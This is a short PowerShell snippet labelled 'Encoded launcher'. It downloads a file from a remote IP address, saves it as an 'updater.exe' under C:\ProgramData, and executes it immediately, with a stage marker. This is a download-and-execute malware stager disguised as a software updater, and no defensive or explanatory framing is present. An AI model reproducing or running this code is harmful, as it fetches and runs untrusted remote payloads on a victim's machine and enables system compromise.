
# Encoded launcher
try { $PayloadUrl = 'https://192.0.2.78:443/updater.ps1'; $OutputPath = "C:\ProgramData\updater.exe"; curl.exe -s -L -o $OutputPath $PayloadUrl; & $OutputPath; $StageMarker = "stage-24" } catch { Write-Warning "Remote fetch failed" }
